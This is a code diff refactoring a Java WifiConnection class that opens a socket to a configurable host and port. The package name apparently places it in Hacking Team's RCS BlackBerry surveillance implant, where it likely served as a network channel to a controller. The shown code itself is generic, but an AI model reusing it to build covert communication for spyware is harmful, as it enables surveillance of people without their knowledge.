@@ -15,37 +15,36 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public class WifiConnection extends Connection {
     static Debug debug = new Debug("Wifi", DebugLevel.VERBOSE);
 
-    private String host_;
-    private int port_;
+    private String host;
+    private int port;
 
     private int timeout = 3 * 60 * 1000;
 
     // Constructor
-    public WifiConnection(String host, int port) {
-        host_ = host;
-        port_ = port;
+    public WifiConnection(String host_, int port_) {
+        this.host = host_;
+        this.port = port_;
     }
 
     public synchronized boolean connect() {
-        String url = "socket://" + host_ + ":" + port_ + ";ConnectionTimeout="
+        String url = "socket://" + host + ":" + port + ";ConnectionTimeout="
                 + timeout;
-        ;
 
         try {
-            connection_ = (StreamConnection) Connector.open(url);
-            in_ = connection_.openDataInputStream();
-            out_ = connection_.openDataOutputStream();
+            connection = (StreamConnection) Connector.open(url);
+            in = connection.openDataInputStream();
+            out = connection.openDataOutputStream();
 
-            Check.ensures(connection_ != null, "connection_ null");
-            Check.ensures(in_ != null, "in_ null");
-            Check.ensures(out_ != null, "out_ null");
+            Check.ensures(connection != null, "connection_ null");
+            Check.ensures(in != null, "in_ null");
+            Check.ensures(out != null, "out_ null");
 
-            connected_ = true;
+            connected = true;
         } catch (IOException e) {
-            connected_ = false;
+            connected = false;
         }
 
-        return connected_;
+        return connected;
     }
 
     protected void error(String string) {
